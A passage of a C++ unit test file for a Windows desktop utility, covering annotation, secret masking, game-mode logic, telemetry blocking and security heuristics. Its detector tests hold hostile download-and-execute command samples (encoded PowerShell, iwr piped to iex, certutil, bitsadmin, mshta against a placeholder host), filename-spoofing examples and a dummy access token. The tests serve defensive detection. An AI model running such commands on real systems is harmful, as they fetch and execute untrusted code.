    DragHandle(dragged, 3, {400, 260});
    Rc grown = Bounds(dragged);
    CHECK(grown.x == 100 && grown.y == 100 && grown.w == 300 && grown.h == 160);
    DragHandle(dragged, 3, {40, 20});
    grown = Bounds(dragged);
    CHECK(grown.x == 40 && grown.y == 20 && grown.Right() == 100 && grown.Bottom() == 100);
    Shape head = arrow;
    DragHandle(head, 1, {200, 0});
    CHECK(head.pts[0].x == 0 && head.pts[1].x == 200 && head.pts[1].y == 0);
    Shape bigger = step;
    DragHandle(bigger, 0, {230, 150});
    CHECK(bigger.width == 60);
    Shape lab;
    lab.tool = Tool::Label;
    lab.text = L"Текст";
    lab.width = 20;
    lab.pts = {{10, 10}};
    lab.extent = {100, 30};
    DragHandle(lab, 0, {999, 70});
    CHECK(lab.width == 40 && lab.extent.x == 200 && lab.extent.y == 60);
    Shape path;
    path.tool = Tool::Marker;
    path.width = 10;
    path.pts = {{0, 0}, {50, 25}, {100, 50}};
    DragHandle(path, 3, {200, 100});
    CHECK(path.pts[1].x == 100 && path.pts[1].y == 50 && path.pts[2].x == 200);
    DragHandle(path, -1, {0, 0});  // нет ручки - ничего не меняется
    CHECK(path.pts[2].x == 200);

    // Выпрямление: чуть наклонная линия становится ровной, заметно косая остаётся
    Pt nearly{200, 8};
    SnapAxis({0, 0}, nearly);
    CHECK(nearly.y == 0 && nearly.x == 200);
    Pt nearlyV{8, 200};
    SnapAxis({0, 0}, nearlyV);
    CHECK(nearlyV.x == 0);
    Pt slanted{200, 60};
    SnapAxis({0, 0}, slanted);
    CHECK(slanted.y == 60);
    std::vector<Pt> underline = {{0, 100}, {50, 103}, {100, 98}, {150, 102}, {200, 104}};
    CHECK(StraightenStroke(underline) && underline.size() == 2 && underline[1].y == 100);
    std::vector<Pt> circle = {{0, 0}, {100, 100}, {200, 0}};
    CHECK(!StraightenStroke(circle) && circle.size() == 3);
    std::vector<Pt> shortStroke = {{0, 0}, {10, 0}, {20, 0}};
    CHECK(!StraightenStroke(shortStroke) && shortStroke.size() == 3);

    CHECK(IsLight(0xFFFFFF) && IsLight(0xFFD23F) && !IsLight(0x101010) && !IsLight(0xE5484D));

    // Секреты: токен закрывается как слово, номер карты из нескольких слов - всей строкой, обычный текст не трогаем
    auto word = [](const wchar_t* t, float x, float y, int line) {
        OcrWord w;
        w.text = t;
        w.box = {x, y, 50, 20};
        w.line = line;
        return w;
    };
    std::vector<OcrWord> plain = {word(L"Всё", 0, 0, 0), word(L"работает", 60, 0, 0)};
    CHECK(SecretBoxes(plain, 3).empty());
    std::vector<OcrWord> token = {word(L"token:", 0, 0, 0), word(L"ghp_aB3dE5gH7jK9mN1pQ3sT5vX7zA9cE1gH3jK", 60, 0, 0)};
    std::vector<Rc> tokenBox = SecretBoxes(token, 3);
    CHECK(tokenBox.size() == 1 && tokenBox[0].x == 57 && tokenBox[0].w == 56);
    std::vector<OcrWord> card = {word(L"4111", 0, 40, 1), word(L"1111", 60, 40, 1), word(L"1111", 120, 40, 1),
                                 word(L"1111", 180, 40, 1)};
    std::vector<Rc> cardBox = SecretBoxes(card, 0);
    CHECK(cardBox.size() == 1 && cardBox[0].x == 0 && cardBox[0].w == 230);
    // оба движка прочли одно и то же: рамка одна
    std::vector<OcrWord> twice = {word(L"ghp_aB3dE5gH7jK9mN1pQ3sT5vX7zA9cE1gH3jK", 60, 0, 0),
                                  word(L"ghp_aB3dE5gH7jK9mN1pQ3sT5vX7zA9cE1gH3jK", 61, 1, 5)};
    CHECK(SecretBoxes(twice, 2).size() == 1);

    // Лента: уходит самый старый без звезды
    CHECK(EvictIndex({false, false}) == 0);
    CHECK(EvictIndex({true, false, false}) == 1);
    CHECK(EvictIndex({true, true}) == 0);
    CHECK(EvictIndex({}) == -1);

    // Стрелка: остриё на месте, линия кончается у основания, крылья по бокам; короткая не выворачивается
    Pt a[4];
    ArrowGeometry({0, 0}, {100, 0}, 4, a);
    CHECK(a[1].x == 100 && a[1].y == 0);
    CHECK(a[0].x > 50 && a[0].x < 100 && a[0].y == 0);
    CHECK(a[2].x == a[0].x && a[3].x == a[0].x && a[2].y > 0 && a[3].y < 0);
    ArrowGeometry({0, 0}, {5, 0}, 10, a);
    CHECK(a[0].x >= 0 && a[0].x < 5);
    ArrowGeometry({7, 7}, {7, 7}, 3, a);
    CHECK(a[0].x == 7 && a[2].y == 7);

    // Размытие: внутри - только клетки одного цвета, снаружи цело, исходные значения не сохраняются
    const int W = 60, H = 40;
    std::vector<uint32_t> px((size_t)W * H);
    for (int y = 0; y < H; ++y)
        for (int x = 0; x < W; ++x) px[(size_t)(y * W + x)] = 0xFF000000u | (uint32_t)((x * 7 + y * 13) & 0xFF) * 0x010101u;
    const std::vector<uint32_t> before = px;
    Pixelate(px.data(), W, H, W, {36, 24}, {12, 0});  // углы в обратном порядке - тоже годится
    const int cell = BlurCell(24, 24);
    CHECK(cell == 12);
    bool flat = true, outside = true, changed = false;
    for (int y = 0; y < H; ++y)
        for (int x = 0; x < W; ++x) {
            uint32_t v = px[(size_t)(y * W + x)];
            bool in = x >= 12 && x < 36 && y >= 0 && y < 24;
            if (!in) {
                outside = outside && v == before[(size_t)(y * W + x)];
                continue;
            }
            int cx = 12 + (x - 12) / cell * cell, cy = (y / cell) * cell;
            flat = flat && v == px[(size_t)(cy * W + cx)];
            changed = changed || v != before[(size_t)(y * W + x)];
        }
    CHECK(flat && outside && changed);
    // За границей картинки - ничего не ломает
    std::vector<uint32_t> copy = before;
    Pixelate(copy.data(), W, H, W, {-50, -50}, {-10, -10});
    Pixelate(copy.data(), W, H, W, {W + 5.0f, 5}, {W + 50.0f, 50});
    CHECK(copy == before);
    // Крупная область - клетки крупнее: крупный текст не читается и сквозь них
    CHECK(BlurCell(600, 300) == 100);
}

void TestSnipName() {
    using namespace snipname;
    CHECK(Context(L"Player.cpp - MyGame - Visual Studio Code", L"Code.exe") == L"MyGame Player.cpp");
    CHECK(Context(L"● main.cpp - RadialMenu - Visual Studio Code", L"Code.exe") == L"RadialMenu main.cpp");
    CHECK(Context(L"Лекция 5 - YouTube - Google Chrome", L"chrome.exe") == L"Лекция 5 - YouTube");
    CHECK(Context(L"Загрузки", L"explorer.exe") == L"Загрузки");
    SYSTEMTIME t{};
    t.wYear = 2026, t.wMonth = 10, t.wDay = 25, t.wHour = 10, t.wMinute = 41, t.wSecond = 5;
    CHECK(FileName(L"MyGame Player.cpp", t) == L"MyGame Player.cpp 2026-10-25 10-41.png");
    CHECK(FileName(L"a/b:c*d?", t) == L"a b c d 2026-10-25 10-41.png");  // запрещённое в имени - пробелами
    CHECK(FileName(L"", t) == L"Снимок 2026-10-25 10-41-05.png");
    CHECK(FileName(std::wstring(200, L'x'), t).size() < 90);
    CHECK(TargetDir(L"D:\\Proj\\", true) == L"D:\\Proj\\screenshots");
    CHECK(TargetDir(L"C:\\Users\\u\\Downloads", false) == L"C:\\Users\\u\\Downloads");
    CHECK(TargetDir(L"", true).empty());
    float pw = 0, ph = 0;
    FitPreview(1920, 1080, 136, 112, pw, ph);  // широкий: упирается в ширину, ничего не срезано
    CHECK(pw == 136 && ph > 76 && ph < 77);
    FitPreview(600, 1800, 136, 112, pw, ph);  // высокий: упирается в высоту
    CHECK(ph == 112 && pw > 37 && pw < 38);
    FitPreview(40, 30, 136, 112, pw, ph);  // мелкий не растягивается
    CHECK(pw == 40 && ph == 30);
    FitPreview(4000, 4, 136, 112, pw, ph);  // полоска не исчезает
    CHECK(pw == 136 && ph == 2);
    FitPreview(0, 0, 136, 112, pw, ph);
    CHECK(pw == 136 && ph == 112);
}

// Кольцо выделенного: раскладка, калькулятор, регистр, пробелы, адрес поиска
void TestSelRing() {
    using namespace selring;
    CHECK(FixLayout(L"ghbdtn") == L"привет");
    CHECK(FixLayout(L"руддщ") == L"hello");
    CHECK(FixLayout(L"Ghbdtn? rfr ltkf&") == L"Привет, как дела?");
    CHECK(FixLayout(L"ntcn 123") == L"тест 123");  // цифры как были

    double v = 0;
    CHECK(Calc(L"2+2", v) && v == 4);
    CHECK(Calc(L"2 * (3 + 4)", v) && v == 14);
    CHECK(Calc(L"1,5*2", v) && v == 3);
    CHECK(Calc(L"2^3^2", v) && v == 512);
    CHECK(Calc(L"-3+10/4", v) && v == -0.5);
    CHECK(Calc(L"7 % 3", v) && v == 1);
    CHECK(Calc(L"6×7=", v) && v == 42);
    CHECK(!Calc(L"42", v));     // просто число - не выражение
    CHECK(!Calc(L"10:30", v));  // время, а не деление
    CHECK(!Calc(L"1/0", v));
    CHECK(!Calc(L"2+", v));
    CHECK(!Calc(L"привет", v));
    CHECK(FormatNumber(1.5, true) == L"1,5" && FormatNumber(3, false) == L"3" &&
          FormatNumber(1.0 / 3, false) == L"0.3333333333");

    CHECK(Sentence(L"пРИВЕТ МИР. ЕЩЁ РАЗ") == L"Привет мир. Ещё раз");
    CHECK(Squeeze(L"  a   b\t c \r\n\r\n\r\n\r\nd  ") == L"a b c\n\nd");
    CHECK(UrlEncode(L"a b&я") == L"a%20b%26%D1%8F");
    CHECK(Words(L"Привет, мир! hello-world 42") == 5);
    CHECK(HasCyrillic(L"abc ё") && !HasCyrillic(L"abc"));
}

// Режимы: включаются сразу, выключаются с запасом; «выключить вручную» держится, пока игра идёт
void TestModeSwitch() {
    // опрос раз в 2 с; sw.on - как его выставит режим
    auto step = [](ModeSwitch& sw, ULONGLONG t, bool seen) {
        sw.on = sw.Want(t, seen);
        return sw.on;
    };
    ModeSwitch sw;
    CHECK(!step(sw, 1000, false));
    CHECK(step(sw, 3000, true));   // игра появилась - сразу
    CHECK(step(sw, 5000, false));  // лаунчер передаёт игру exe-шнику: пропала на миг
    CHECK(step(sw, 7000, false));
    CHECK(step(sw, 9000, true));  // вернулась - режим не дёрнулся
    CHECK(step(sw, 11000, false));
    CHECK(step(sw, 17000, false));   // 8 с без игры - ещё держится
    CHECK(!step(sw, 19000, false));  // 10 с - выключился

    // выключили руками посреди игры: один пропущенный опрос (раньше снимал отметку) - режим не возвращается
    ModeSwitch m;
    step(m, 0, true);
    m.SetManual(false, 2000, true);
    m.on = false;
    CHECK(!step(m, 4000, true));
    CHECK(!step(m, 6000, false));
    CHECK(!step(m, 8000, true));
    // игру закрыли надолго - в следующий раз режим снова включится сам
    CHECK(!step(m, 10000, false));
    CHECK(!step(m, 20000, false));
    CHECK(step(m, 22000, true));

    // вручную включили без игры - держится; выключили без игры - сразу, без запаса
    ModeSwitch h;
    h.SetManual(true, 0, false);
    CHECK(step(h, 2000, false));
    CHECK(step(h, 60000, false));
    h.SetManual(false, 61000, false);
    CHECK(!step(h, 62000, false));
    // игра закрылась только что, режим ещё держится запасом - «выключить» гасит сразу
    ModeSwitch g;
    step(g, 1000, true);  // время 0 значит «не видели» - часы Windows с нуля не идут
    CHECK(step(g, 2000, false));
    g.SetManual(false, 3000, false);
    CHECK(!step(g, 4000, false));

    // игра без маски: на весь экран, но браузер, плеер, слайды, редактор - не игра
    CHECK(NotAGame(L"chrome.exe") && NotAGame(L"vlc.exe") && NotAGame(L"powerpnt.exe"));
    CHECK(NotAGame(L"potplayermini64.exe") && NotAGame(L"unrealeditor.exe"));
    CHECK(!NotAGame(L"eldenring.exe") && !NotAGame(L"minecraft.windows.exe"));
    // из журнала: снимок экрана, экран блокировки, программы из библиотеки Steam, заставка
    CHECK(NotAGame(L"snippingtool.exe") && NotAGame(L"lockapp.exe") && NotAGame(L"blender.exe"));
    CHECK(NotAGame(L"godot_v4.3-stable_win64.exe") && NotAGame(L"vtube studio.exe") && NotAGame(L"mystify.scr"));
    CHECK(!NotAGame(L".scr") && !NotAGame(L"ahitr.exe"));
    // папка-маска не делает игрой Blender из Steam, а названная по имени программа - игра
    const std::wstring games = L"*\\steamapps\\common\\*|NFS14.exe|Blender*.exe";
    CHECK(NamedExactly(L"nfs14.exe", games) && !NamedExactly(L"blender.exe", games));
    CHECK(!NamedExactly(L"common", games) && !NamedExactly(L"nfs14.exe", L""));
    CHECK(Is3dModule(L"d3d12.dll") && Is3dModule(L"vulkan-1.dll") && Is3dModule(L"opengl32.dll"));
    CHECK(!Is3dModule(L"dxgi.dll") && !Is3dModule(L"d3dcompiler_47.dll"));
}

// «Защита»: маскировка по имени (похожее на системное, двойное расширение, невидимые знаки) и скрипты в автозапуске
void TestSecurityHeuristics() {
    CHECK(tools::OneEdit(L"svchost", L"scvhost"));   // перестановка соседних
    CHECK(tools::OneEdit(L"svchost", L"svch0st"));   // замена
    CHECK(tools::OneEdit(L"svchost", L"svchosts"));  // вставка
    CHECK(!tools::OneEdit(L"svchost", L"svchost"));
    CHECK(!tools::OneEdit(L"svchost", L"vschots"));
    std::vector<std::wstring> sys = {L"svchost.exe", L"lsass.exe", L"explorer.exe"};
    CHECK(tools::LookAlikeIn(L"scvhost.exe", sys) == L"svchost.exe");
    CHECK(tools::LookAlikeIn(L"svchost.exe", sys).empty());  // само имя - не «похоже»
    CHECK(tools::LookAlikeIn(L"lsas.exe", sys).empty());     // короткие имена не сравниваем: много ложных
    CHECK(tools::LookAlikeIn(L"explorer.dll", sys).empty());

    CHECK(tools::DoubleExt(L"отчёт.pdf.exe"));
    CHECK(tools::DoubleExt(L"фото.jpg      .scr"));  // пробелы прячут настоящее расширение
    CHECK(tools::DoubleExt(L"счёт.pdf.js"));
    CHECK(tools::DoubleExt(L"invoice.docx.hta"));
    CHECK(!tools::DoubleExt(L"setup.exe"));
    CHECK(!tools::DoubleExt(L"report.pdf"));
    CHECK(!tools::DoubleExt(L"node.js"));

    CHECK(
        tools::BidiSpoof(L"отчёт\x202E"
                         L"fdp.exe"));
    CHECK(
        tools::BidiSpoof(L"a\x2067"
                         L"b.exe"));
    CHECK(!tools::BidiSpoof(L"Обычное имя (1).exe"));

    // образцы атак собираются при запуске (без «~»): целиком в exe тестов их принимает за вредонос антивирус
    auto R = [](std::wstring s) {
        s.erase(std::remove(s.begin(), s.end(), L'~'), s.end());
        return tools::ScriptLaunch(s);
    };
    CHECK(!R(L"pow~ershell.exe -NoP -W Hid~den -Enc~odedCommand SQB~FAFgA").empty());
    CHECK(!R(L"pw~sh -e~c SQB~FAFgA").empty());
    CHECK(!R(L"pow~ershell /e SQB~FAFgA").empty());
    CHECK(!R(L"pow~ershell -c \"i~wr ht~tp://x/a.ps1 | i~ex\"").empty());
    CHECK(!R(L"pow~ershell (New-Object Net.Web~Client).Down~loadFile('ht~tp://x','a.exe')").empty());
    CHECK(!R(L"cert~util -url~cache -split -f ht~tp://x/a.exe a.exe").empty());
    CHECK(!R(L"bits~admin /trans~fer j ht~tp://x/a.exe C:\\a.exe").empty());
    CHECK(!R(L"msh~ta ht~tp://x/a.hta").empty());
    CHECK(!R(L"cmd.exe /c C:\\Users\\u\\AppData\\Roaming\\x.bat").empty());
    CHECK(tools::ScriptLaunch(L"powershell.exe -ExecutionPolicy Bypass -File C:\\Tools\\backup.ps1").empty());
    CHECK(tools::ScriptLaunch(L"\"C:\\Program Files\\App\\app.exe\" --minimized").empty());
    CHECK(tools::ScriptLaunch(L"C:\\Windows\\System32\\cmdkey.exe /list")
              .empty());  // «cmd» в имени - не командная строка
}

// Сторож служб: антивирусы не выключаем, «вернуть» - только из списка выключенного и с записанным типом запуска
void TestSysItemOff() {
    CHECK(tools::SecurityVendor(L"c:\\program files\\crowdstrike\\csfalconservice.exe"));
    CHECK(tools::SecurityVendor(L"sophos limited"));
    CHECK(tools::SecurityVendor(L"eset, spol. s r.o."));
    CHECK(!tools::SecurityVendor(L"c:\\program files\\preset manager\\svc.exe"));  // «eset» внутри слова - не ESET
    CHECK(!tools::SecurityVendor(L"valve corp."));

    std::wstring t = tools::SysOffAdd(L"", L"svc", L"Foo", SERVICE_AUTO_START);
    t = tools::SysOffAdd(t, L"drv", L"Bar", SERVICE_SYSTEM_START);
    t = tools::SysOffAdd(t, L"svc", L"Foo", SERVICE_DEMAND_START);  // второй раз - запись заменяется
    DWORD start = 99;
    CHECK(!tools::SysOffTake(t, L"drv", L"Foo", start));  // вид не тот
    CHECK(tools::SysOffTake(t, L"svc", L"foo", start) && start == SERVICE_DEMAND_START);
    CHECK(!tools::SysOffTake(t, L"svc", L"Foo", start));  // взяли - больше нет
    CHECK(tools::SysOffTake(t, L"drv", L"Bar", start) && start == SERVICE_SYSTEM_START);
    // подделанная строка: служба «при загрузке ядра» и «отключена» не возвращаются
    std::wstring bad = L"svc\tEvil\t0\nsvc\tOff\t4\n";
    CHECK(!tools::SysOffTake(bad, L"svc", L"Evil", start));
    CHECK(!tools::SysOffTake(bad, L"svc", L"Off", start));
}

// «Подробнее»: знакомые программы в любом регистре и с путём, у каждого действия кольца утилит есть текст
// RadialShutUp: hosts (свои строки помечены, чужие не трогаются), журнал, готовые профили
void TestShutUpExtras() {
    std::string hosts = "# Copyright\r\n127.0.0.1 localhost\r\n0.0.0.0 watson.microsoft.com\r\n";
    CHECK(shutup::HostsBlocks(hosts, "watson.microsoft.com"));
    CHECK(!shutup::HostsBlocks(hosts, "v10.events.data.microsoft.com"));
    CHECK(!shutup::HostsBlocks("# 0.0.0.0 v10.events.data.microsoft.com\r\n", "v10.events.data.microsoft.com"));
    std::string added = shutup::HostsAdd(hosts, {"watson.microsoft.com", "v10.events.data.microsoft.com"});
    CHECK(shutup::HostsBlocks(added, "v10.events.data.microsoft.com"));
    CHECK(added.find("0.0.0.0 watson.microsoft.com # RadialShutUp") == std::string::npos);  // уже был - не дублируем
    std::string back = shutup::HostsRemove(added, {"watson.microsoft.com", "v10.events.data.microsoft.com"});
    CHECK(back == hosts);  // своя строка ушла, чужая (без пометки) осталась
    shutup::JournalEntry e{L"25.10.2026 21:40", L"окно\tс табуляцией", L"ads_id", true, false}, d;
    CHECK(shutup::DecodeJournal(shutup::EncodeJournal(e), d));
    CHECK(d.id == L"ads_id" && d.priv && !d.ok && d.source == L"окно с табуляцией");
    CHECK(!shutup::DecodeJournal(L"мусор", d));
    std::vector<std::wstring> soft = shutup::BuiltinProfile(0), strict = shutup::BuiltinProfile(1),
                              game = shutup::BuiltinProfile(2);
    CHECK(!soft.empty() && strict.size() > soft.size() && game.size() > soft.size());
    for (const std::wstring& id : game) CHECK(shutup::Find(id) != nullptr);
    CHECK(std::find(soft.begin(), soft.end(), L"onedrive") == soft.end());  // не рекомендуемое - ни в одном
    CHECK(std::find(strict.begin(), strict.end(), L"onedrive") == strict.end());
    CHECK(shutup::Find(L"office_telemetry")->Admin() && !shutup::Find(L"office_telemetry")->Machine());
    CHECK(shutup::Find(L"tasks_ceip")->Machine() && shutup::Find(L"hosts_block")->Machine());
    CHECK(shutup::SettingsUri(L"app_webcam") != nullptr && shutup::SettingsUri(L"нет") == nullptr);
}

void TestExplain() {
    CHECK(!explain::Process(L"chrome.exe").empty());
    CHECK(explain::Process(L"C:\\Program Files\\Google\\Chrome.EXE") == explain::Process(L"chrome.exe"));
    CHECK(explain::Process(L"javaw") == explain::Process(L"javaw.exe"));
    CHECK(explain::Process(L"нет-такой.exe").empty());
    // незнакомая программа - всё равно объяснено, как закрывается и как усыпляется
    CHECK(explain::Close(L"нет-такой.exe").find(L"5 секунд") != std::wstring::npos);
    CHECK(explain::Sleep(L"discord.exe").find(L"Discord") != std::wstring::npos);
    CHECK(!explain::Keep(L"x.exe").empty() && !explain::BoostOffer().empty());
    for (const wchar_t* k :
         {L"app:0",      L"leak:1",      L"hog:2",      L"port:0",          L"ports-old",  L"tails",
          L"pagefile",   L"start-off:3", L"clean:0",    L"clean-all",       L"bin",        L"ddc-trim",
          L"sys-clean",  L"vhd",         L"left:0",     L"dup:0",           L"dup-scan",   L"proj:1",
          L"proj-idle",  L"giant:hiber", L"path-clean", L"path-add",        L"path-acl",   L"conflict:0",
          L"net-top",    L"power",       L"wake",       L"balance-restore", L"health",     L"driver",
          L"sys-reboot", L"rec-repair",  L"rec-wu",     L"rec-unbreak",     L"rec-points", L"rec-explorer",
          L"rec-boot",   L"rec-offline", L"sec-find:0", L"sec-sandbox",     L"term",       L"lock-clip"})
        CHECK(!explain::Action(k).empty());
    CHECK(explain::Action(L"").empty() && explain::Action(L"open").empty());
    CHECK(explain::Action(L"app:0", L"discord.exe").find(L"Discord") != std::wstring::npos);
}

// RadialShutUp: каталог без повторов и пустых мест, бэкап значения туда и обратно, профиль
void TestShutUpCatalog() {
    const auto& all = shutup::Catalog();
    CHECK(all.size() >= 50);
    std::vector<std::wstring> ids, groups = shutup::Groups();
    CHECK(groups.size() == 9);
    for (const shutup::Setting& s : all) {
        CHECK(std::find(ids.begin(), ids.end(), s.id) == ids.end());  // id уникален: по нему профиль и бэкап
        ids.push_back(s.id);
        CHECK((!s.values.empty() || !s.tasks.empty() || !s.hosts.empty()) && wcslen(s.title) > 0 && wcslen(s.why) > 0);
        CHECK(std::find(groups.begin(), groups.end(), s.group) != groups.end());
        CHECK(shutup::Find(s.id) == &s);
        for (const shutup::RegValue& v : s.values) {
            CHECK(v.root == HKEY_CURRENT_USER || v.root == HKEY_LOCAL_MACHINE);
            CHECK(v.type == REG_DWORD || (v.type == REG_SZ && wcslen(v.text) > 0));
            // «ключ|имя» в бэкапе разбирается однозначно
            CHECK(v.key[0] != L'\\' && wcschr(v.name, L'|') == nullptr);
        }
    }
    CHECK(shutup::Find(L"telemetry") && shutup::Find(L"telemetry")->Machine());
    CHECK(shutup::Find(L"ads_id") && !shutup::Find(L"ads_id")->Machine());
    CHECK(!shutup::Find(L"нет такой"));
    for (const shutup::Setting& s : all) CHECK(shutup::Details(s.id) != nullptr);  // «Подробнее» у каждой
    // что нужно для вступления в силу: службы - перезагрузка, Explorer\Advanced - перезапуск Проводника
    CHECK(shutup::RestartOf(*shutup::Find(L"diagtrack")) == shutup::Restart::Reboot);
    CHECK(shutup::RestartOf(*shutup::Find(L"copilot")) == shutup::Restart::Explorer);
    CHECK(shutup::RestartOf(*shutup::Find(L"ads_id")) == shutup::Restart::None);
    CHECK(shutup::Find(L"feedback")->User() && shutup::Find(L"feedback")->Machine());
    shutup::Status drift;  // меняли мы, а сейчас выключено - сбросилось
    drift.ours = true;
    CHECK(drift.Drifted());
    drift.state = shutup::State::On;
    CHECK(!drift.Drifted());

    shutup::Saved a;
    a.had = true;
    a.type = REG_SZ;
    a.value = L"C:\\путь\tс табом\nи строкой\\";
    shutup::Saved b;
    CHECK(shutup::DecodeSaved(shutup::EncodeSaved(a), b));
    CHECK(b.had && b.type == REG_SZ && b.value == a.value);
    shutup::Saved none;  // значения не было
    CHECK(shutup::DecodeSaved(shutup::EncodeSaved(none), b) && !b.had && b.value.empty());
    CHECK(!shutup::DecodeSaved(L"мусор", b));
    CHECK(shutup::BackupKey(shutup::Find(L"ads_id")->values[0]) ==
          L"Software\\Microsoft\\Windows\\CurrentVersion\\AdvertisingInfo|Enabled");

    std::vector<std::wstring> back =
        shutup::DecodeProfile(shutup::EncodeProfile({L"ads_id", L"telemetry"}) + L"чужое\r\n# коммент\nads_id\r\n");
    CHECK(back.size() == 2 && back[0] == L"ads_id" && back[1] == L"telemetry");
}

}  // namespace

// «Важное»: опасное раньше всего, порядок по важности, не больше 6, пустой снимок - пусто.
// О8: диапазон Wi-Fi по скорости связи, когда канал не отдают
void TestWifiBand() {
    CHECK(net::WifiBandGuess(1201) == L"скорее 5 или 6 ГГц");
    CHECK(net::WifiBandGuess(144) == L"скорее 2,4 ГГц");
    CHECK(net::WifiBandGuess(300).empty());  // бывает и там, и там
    CHECK(net::WifiBandGuess(0).empty());
}

// О5: итог обхода на диске - туда и обратно, табуляция в именах не ломает строку
void TestScanCache() {
    tools::ScanCache c;
    c.when = 1792700000, c.ddcOld = 123;
    tools::Junk j;
    j.name = L"Кэш\tnpm", j.path = L"C:\\npm", j.bytes = 7, j.fresh = 2, j.slow = true;
    c.junk.push_back(j);
    tools::ProjectJunk p;
    p.project = L"D:\\proj", p.name = L"proj", p.path = L"D:\\proj\\node_modules", p.kind = L"node_modules";
    p.bytes = 99, p.idleDays = 40;
    c.projects.push_back(p);
    tools::ScanCache b;
    CHECK(tools::ParseScanCache(tools::ScanCacheRows(c), b));
    CHECK(b.when == c.when && b.ddcOld == 123 && b.junk.size() == 1 && b.projects.size() == 1);
    CHECK(b.junk[0].name == L"Кэш npm" && b.junk[0].bytes == 7 && b.junk[0].fresh == 2 && b.junk[0].slow);
    CHECK(b.projects[0].path == p.path && b.projects[0].idleDays == 40 && b.projects[0].bytes == 99);
    CHECK(!tools::ParseScanCache(L"junk\tбез времени\t\t1\t0\t0\t0", b));
}

// П11: radial.cfg по смыслу - настройки, секторы, пункты по подписи, порядок
void TestCfgDiff() {
    std::wstring a =
        L"# комментарий\n[settings]\ntheme = crimson\nsounds = 1\n[@left]\n[Код]\npath = D:\\Код\n"
        L"item = web | D:\\web | icons/web.png\nitem = java | D:\\java\n[Учёба]\npath = D:\\У\n"
        L"[@right]\n[Музыка]\npath = D:\\M\n";
    std::wstring b =
        L"[settings]\ntheme = sunset\nsounds = 1\nvolume = 35\n[@left]\n[Учёба]\npath = D:\\У\n"
        L"[Код]\npath = D:\\Код\nitem = web | D:\\web2 | icons/web.png\nitem = C++ | D:\\cpp\n"
        L"[@right]\n[Minecraft]\npath = C:\\Prism\n";
    std::vector<cfgdiff::Change> d = cfgdiff::Diff(a, b);
    auto has = [&](cfgdiff::Change::Kind k, const std::wstring& where, const std::wstring& what) {
        for (const cfgdiff::Change& c : d)
            if (c.kind == k && c.where == where && c.what.find(what) != std::wstring::npos) return true;
        return false;
    };
    CHECK(has(cfgdiff::Change::CHANGED, L"Настройки", L"theme: crimson -> sunset"));
    CHECK(has(cfgdiff::Change::ADDED, L"Настройки", L"volume: 35"));
    CHECK(has(cfgdiff::Change::CHANGED, L"Левый край", L"порядок секторов"));
    CHECK(has(cfgdiff::Change::CHANGED, L"Левый край / Код", L"пункт «web»"));
    CHECK(has(cfgdiff::Change::ADDED, L"Левый край / Код", L"пункт «C++»"));
    CHECK(has(cfgdiff::Change::REMOVED, L"Левый край / Код", L"пункт «java»"));
    CHECK(has(cfgdiff::Change::ADDED, L"Правый край", L"сектор «Minecraft»"));
    CHECK(has(cfgdiff::Change::REMOVED, L"Правый край", L"сектор «Музыка»"));
    CHECK(d.size() == 8);
    CHECK(cfgdiff::Summary(d) == L"+3, -2, изменено 3");
    CHECK(cfgdiff::Diff(a, a).empty() && cfgdiff::Summary({}).empty());
}

// П12: числа отчёта туда и обратно, разница к прошлой неделе - без шума
void TestWeekReport() {
    const ULONGLONG GB = 1024ull * 1024 * 1024;
    weekreport::Data a;
    a.when = 1792604800, a.to = L"23.10", a.drops = 3, a.tunnelDown = 46, a.directDown = 105, a.batteryWear = 11;
    a.disks = {{L"C:\\", 140 * GB, 475 * GB}, {L"D:\\", 211 * GB, 476 * GB}};
    weekreport::Data b;
    CHECK(weekreport::ParseNumbers(weekreport::NumbersRow(a), b));
    CHECK(b.when == a.when && b.to == L"23.10" && b.drops == 3 && b.tunnelDown == 46 && b.batteryWear == 11);
    CHECK(b.disks.size() == 2 && b.disks[1].free == 211 * GB && b.disks[0].root == L"C:\\");
    weekreport::Data prev = a;
    prev.when -= 7 * 24 * 3600, prev.drops = 1, prev.tunnelDown = 38, prev.directDown = 100, prev.batteryWear = 10;
    prev.disks[0].free = 152 * GB, prev.disks[1].free = 211 * GB + GB / 2;  // D: - меньше гигабайта, шум
    std::vector<std::wstring> d = weekreport::Deltas(a, prev);
    CHECK(d.size() == 4);
    CHECK(d[0].find(L"C: свободно -12") == 0);
    CHECK(d[1] == L"обрывов интернета 3 (было 1)");
    CHECK(d[2].find(L"через туннель быстрее на 21%") == 0);  // напрямую +5% - шум, не пишется
    CHECK(d[3] == L"износ батареи 11% (было 10%)");
    CHECK(weekreport::Deltas(a, weekreport::Data()).empty());  // сравнивать не с чем
}

void TestImportant() {
    tools::ImportantIn in;
    CHECK(tools::ImportantTodos(in).empty());
    in.findScores = {3, 7, 9};  // «странно» в «Важное» не идёт
    in.git = {{6, 0}, {0, 3}};  // второй репозиторий спокойный
    in.freeable = 3ull << 30;
    in.quickPlaces = 1;
    std::vector<tools::ImportantTodo> t = tools::ImportantTodos(in);
    CHECK(t.size() == 4);
    CHECK(t[0].key == L"sec-find:1" && t[0].why == L"Опасное" && t[1].key == L"sec-find:2");
    CHECK(t[2].key == L"clean:" && t[2].why.find(L"Можно освободить") == 0);
    CHECK(t[3].key == L"git:0");
    in.quickPlaces = 3;
    in.freeable = 1ull << 30;  // меньше 2 ГБ - не дело
    in.broken = in.reboot = in.updatesFailed = in.deviceErrors = in.driverNewer = in.balanceLowered = true;
    in.lowDisks = {L"C:\\"};
    t = tools::ImportantTodos(in);
    CHECK(t.size() == 6);  // предел
    CHECK(t[2].key == L"rec-unbreak" && t[3].key == L"sys-reboot" && t[4].key == L"scan:C:\\" && t[5].key == L"sys-wu");
    CHECK(tools::ImportantTodos(in, 100).size() == 10);
    in.freeable = 5ull << 30;
    CHECK(tools::ImportantTodos(in, 100)[5].key == L"clean-all");

    // О6: от батареи ждём, пока прошлый раз моложе суток; от сети, ни разу и с часами назад - не ждём
    const LONGLONG now = 1792700000, day = 24 * 3600;
    CHECK(tools::HeavyDefer(true, now, now - 3600));
    CHECK(!tools::HeavyDefer(true, now, now - day));
    CHECK(!tools::HeavyDefer(false, now, now - 3600));
    CHECK(!tools::HeavyDefer(true, now, 0));
    CHECK(!tools::HeavyDefer(true, now, now + 3600));
}

// Здоровье программы (Л27): поломки отдельно от выключенного нарочно, одной строкой - что отвалилось
void TestAppHealth() {
    tools::AppHealthIn in;
    in.mouseWanted = in.mouseHooked = true;
    in.autostartOn = true;
    in.adminReady = true;
    in.watchAgeMs = 30000;
    in.uptimeMs = 3600000;
    std::vector<tools::AppPart> v = tools::AppHealth(in);
